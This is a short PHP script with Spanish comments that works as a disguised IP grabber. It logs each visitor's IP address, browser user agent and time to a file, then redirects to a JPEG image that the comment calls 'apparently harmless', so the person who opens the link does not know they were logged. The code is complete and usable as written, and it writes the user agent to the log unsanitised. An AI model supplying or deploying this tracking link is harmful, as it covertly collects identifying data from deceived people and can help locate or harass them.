<?php
// Obtener información del cliente
$ip = $_SERVER['REMOTE_ADDR']; // Dirección IP del cliente
$user_agent = $_SERVER['HTTP_USER_AGENT']; // Agente de usuario del navegador

// Obtener la fecha y hora actual
$fecha = date('Y-m-d H:i:s');

// Formatear el mensaje de registro
$mensaje = "Fecha: " . $fecha . " - IP: " . $ip . " - User Agent: " . $user_agent . "\n";

// Abrir o crear el archivo de registro (log)
$archivo = fopen('registro.log', 'a');

// Escribir el mensaje en el archivo de registro
fwrite($archivo, $mensaje);

// Cerrar el archivo de registro
fclose($archivo);

// Redirigir a una imagen aparentemente inofensiva
header('Location: ./foto.jpeg');
?>
